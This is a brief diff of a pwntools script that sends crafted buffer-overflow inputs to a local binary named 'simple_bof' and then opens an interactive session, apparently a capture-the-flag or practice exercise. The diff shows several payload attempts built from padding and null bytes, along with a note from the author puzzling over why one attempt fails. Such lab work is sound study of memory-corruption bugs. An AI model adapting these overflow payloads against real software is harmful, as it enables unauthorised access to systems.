@@ -8,10 +8,10 @@ context.arch='amd64'
 
 p = process('./simple_bof')
 
-# p.sendlineafter(": ", b"A"*14)
+# p.sendlineafter(": ", b"A"*14) # why this doesn't work?
 
-# p.sendlineafter(": ", b"A"*6+b"\0"+b"A"*6+b"\0")
+# p.sendlineafter(": ", b"A"*6 + b"\0" + b"A"*6 + b"\0")
 
-p.sendlineafter(": ", b"A"*1+b"\0"+b"B"*5 + b"A"*1+b"\0"+b"B"*5)
+p.sendlineafter(": ", b"\0"*8)
 
 p.interactive()
